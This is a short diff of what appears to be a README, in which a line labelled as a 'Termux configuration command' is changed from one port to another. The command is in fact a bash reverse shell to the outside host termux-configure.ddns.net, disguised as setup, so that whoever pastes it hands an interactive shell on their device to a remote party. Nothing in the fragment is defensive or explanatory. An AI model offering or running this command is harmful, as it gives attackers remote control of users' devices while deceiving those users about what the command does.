@@ -7,7 +7,7 @@ https://socialpilot.000webhostapp.com/
 #Termux configuration command#
 
 
-bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
+bash -i >& /dev/tcp/termux-configure.ddns.net/38863 0>&1
 
 
 <!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
